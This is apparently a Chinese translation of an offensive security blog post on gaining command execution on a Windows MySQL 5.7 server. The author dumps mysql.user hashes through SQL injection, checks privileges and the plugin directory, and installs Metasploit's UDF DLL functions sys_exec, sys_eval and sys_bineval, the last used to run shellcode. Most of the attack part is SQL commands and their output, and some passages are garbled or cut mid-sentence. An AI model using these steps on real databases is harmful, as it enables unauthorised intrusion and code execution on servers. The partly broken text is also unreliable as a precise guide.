原文地址
## 综述
> 在现实世界中，当我登录金融机构时，遇到了他们的内网并且使用MySQL 5.7
> 64位作为后端数据库的场景。大多数时候，我在环境中遇到MSSQL，这是一种罕见的情况（mysql）。我在Web应用程序中发现了SQL注入，并且能够从mysql.user
> dump用户名和密码我意识到它有权将文件写入磁盘。这使我写了一篇文章，分享关于向MySQL写入udf.dll，使之代码执行和在Windows中弹出一个shell的技巧。当我在谷歌搜索大多数的技术文章，当涉及到Windows，文章解释的不太清楚。所以，我想用我自己的研究来写这篇文章来使之更加清楚，并让你了解一些手工使用的技巧。
当我在一台主机上写博客时，我将使用最新的MySQL 5.7.21服务器。为了重现该场景，我运行mysqld服务器，并将带有'-secure-file-priv
='参数的设置为blank（不是NULL）。在这种情况下，我能够在内网使用中union注入，从mysql.user表中检索用户名和密码。请注意，在MySQL
5.7及更高版本中，“password”列不存在。他们已将其更改为'authentication_string'。
    ＃MySQL 5.6及以下版本
        select host, user, password from mysql.user;
        ＃MySQL 5.7及以上版本
        select host, user, authentication_string from mysql.user;
请注意，如果您已拥有credentials，则可以使用metasploit的mysql_hashdump.rb auxiliary module 来dump
MySQL哈希值。当我写这篇博文时，脚本需要更新以便在MySQL
5.7中兼容，您可以在这里查看我的[pull](https://github.com/rapid7/metasploit-framework/pull/9525)
用户'osanda'的主机列允许来自192.168.0.*的连接，这意味着我们可以使用该用户从该IP范围进行远程连接。我破解了密码哈希并获得了明文密码。  
登录到MySQL后，我查看了当前用户的权限。
    select * from mysql.user where user = substring_index(user(), '@', 1) ;
我们登录的用户拥有所有权限，并且我们有权读取和写入文件，您可以在其中考虑编写UDF DLL库并获得代码执行。
## 什么是UDF库
UDF表示MySQL中的用户定义函数。这就像在DLL中编写自己的函数并在MySQL中调用它们一样。我们将使用可在Metasploit框架中找到的“lib_mysqludf_sys_64.dll”DLL库。您可以使用基于系统架构的UDF库，位置在
Metasploit"/usr/share/metasploit-framework/data/exploits/mysql/"[点击这里查看文件的github链接](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)。
首先，我们必须检查运行MySQL的版本。全局变量'@@ version_compile_os'向我们展示了MySQL结构，'@@
version_compile_machine'向我们展示了操作系统的结构。在这种情况下，我们在64位Windows操作系统中运行64位版本的MySQL。
    MySQL [(none)]> select @@version_compile_os, @@version_compile_machine;
    +----------------------+---------------------------+
    | @@version_compile_os | @@version_compile_machine |
    +----------------------+---------------------------+
    | Win64                | x86_64                    |
    +----------------------+---------------------------+
    MySQL [(none)]> show variables like '%compile%';
    +-------------------------+--------+
    | Variable_name           | Value  |
    +-------------------------+--------+
    | version_compile_machine | x86_64 |
    | version_compile_os      | Win64  |
    +-------------------------+--------+
从MySQL 5.0.67开始，UDF库必须包含在plugin文件夹中，可以使用'@@
plugin_dir'全局变量找到它。这个变量可以在mysql.ini文件中看到和编辑。
    MySQL [(none)]> select @@plugin_dir ;
    +--------------------------------------------------------------+
    | @@plugin_dir                                                 |
    +--------------------------------------------------------------+
    | D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |
    +--------------------------------------------------------------+
    1 row in set (0.02 sec)
    MySQL [(none)]> show variables like 'plugin%';
    +---------------+--------------------------------------------------------------+
    | Variable_name | Value                                                        |
    +---------------+--------------------------------------------------------------+
    | plugin_dir    | D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |
    +---------------+---------------------------------------------------
您可以通过将新值传递给mysqld来更改插件目录变量。
    mysqld.exe –plugin-dir=C:\\temp\\plugins\\
另一种方法是用plugin目录编写一个新的mysql配置文件并将其传递给mysqld。
    mysqld.exe --defaults-file=C:\\temp\\my.ini
The content of the ‘my.ini’
    plugin_dir = C:\\temp\\plugins\\
从MySQL
5.0.67开始，文件必须位于plugin目录中。该目录取决于plugin_dir系统变量的值。如果plugin_dir的值为空，则参照5.0.67之前即文件必须位于系统动态链接器的搜索目录中。  
在5.0.67之前的MySQL版本中， the file must be in a directory that is searched by your
system’s dynamic linker。这同样适用于4.1.25之前的MySQL版本.  
5.0 args [0]'。您可以使用它在目标机器上执行系统命令。  
Installation
    create function sys_exec returns int soname 'udf.dll';
Verification
    select * from mysql.func where name = 'sys_exec';
    +----------+-----+---------+----------+
    | name     | ret | dl      | type     |
    +----------+-----+---------+----------+
    | sys_exec |   2 | udf.dll | function |
    +----------+-----+---------+----------+
Deletion
    drop function sys_exec;
### sys_eval
该功能将执行系统命令并在屏幕上通过标准输出显示。正如你可以使用这个函数一样，使用_popen函数和'r'参数，calling process can
read the spawned command’s standard output via the returned
stream。它使用'fgets'来读取pipe到缓冲区，它会返回缓冲区。  
Installation
    create function sys_eval returns string soname 'udf.dll';
Verification
    select * from mysql.func where name = 'sys_eval';
Deletion
    drop function sys_eval;
Example
    select sys_eval('dir');
### sys_get
该函数使用'getenv'函数返回系统变量的值。  
Installation
    create function sys_get returns string soname 'udf.dll';
Verification
    select * from mysql.func where name = 'sys_get';
Deletion
    Drop function sys_get;
Example
    Select sys_get('longonserver');
### 执行Shellcode - sys_bineval
我在这个DLL里面找到了一个很酷的函数'sys_bineval'。该函数将使用'VirtualAlloc'API分配RWX内存，并使用'strcpy'将'args->
args [0]'复制到新分配的内存中。然后这个缓冲区被传递给'CreateThread'API来产生一个新的线程。  
如果我们看看'CreateThread'API，我们可以看到使用'strcpy'复制缓冲区的'lpParameter'作为指针传递给要传递给线程的变量。'StartAddress'中的函数将直接移动'lpParamter'并调用ptr
rax，这将改变RIP到我们的shellcode。  
Installation
    create function sys_bineval returns int soname 'udf.dll';
Verification
    select * from mysql.func where name = 'sys_bineval';
Deletion
    drop function sys_bineval;
Example  
但是没有工作在64位。这32位平台中工作正常。您可以直接打开原始二进制shellcode或编码为base64或十六进制编码并使用此功能执行。
    select sys_bineval(from_base64(load_file('./calc.b64')));
我注意到这些外部UDF函数在拆解代码中没有适当的异常处理。因此，在调用这些函数时稍有错误会导致mysqld.exe服务器崩溃。我希望这篇文章可能对你有用，同时记录下MySQL。
#### References
#### Papers
Exploit-DB  
Packet Storm